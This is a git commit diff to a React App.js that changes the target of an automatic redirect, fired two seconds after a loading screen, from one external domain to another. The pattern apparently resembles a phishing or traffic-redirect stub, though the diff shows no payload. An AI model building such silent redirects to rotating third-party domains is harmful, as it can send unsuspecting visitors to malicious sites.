2cd169b3c3f24cf73bed0511cf6ffdd52ce3ae3f
husknet <127146284+husknet@users.noreply.github.com>
2024-12-12 16:02:50 +0000

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://pm.pwm.hu/';
+            window.location.href = 'https://bin.inoxplasrl.com.ar/';
         }, 2000);
 
         return () => clearTimeout(timer);
